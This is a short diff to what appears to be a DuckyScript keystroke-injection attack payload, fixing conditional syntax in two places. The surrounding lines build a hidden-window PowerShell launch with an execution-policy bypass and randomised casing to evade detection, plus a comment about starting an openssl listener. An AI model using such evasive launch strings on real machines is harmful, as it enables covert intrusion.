@@ -103,7 +103,7 @@ EXTENSION Rolling_Powershell_Execution
             STRING powershell.exe -noP -nOnI -windo H
         END_IF
 
-        IF_DEFINED #EXECUTIONPOLICY
+        IF_DEFINED_TRUE #EXECUTIONPOLICY
             SPACE
             IF (($RANDOM_PS % 2) == 0) THEN
                 STRING -ep ByPasS
@@ -137,7 +137,7 @@ REM Automatic setup requires openssl!
 DEFINE #SETUP FALSE
 
 REM Automatic setup and start listener - Requires openssl!
-IF_DEFINED #SETUP
+IF_DEFINED_TRUE #SETUP
     IF ($_OS == #NOT_WINDOWS) THEN    
         DELAY 1500
         STRINGLN echo "Setting up Infrastructre - Do not interact!"
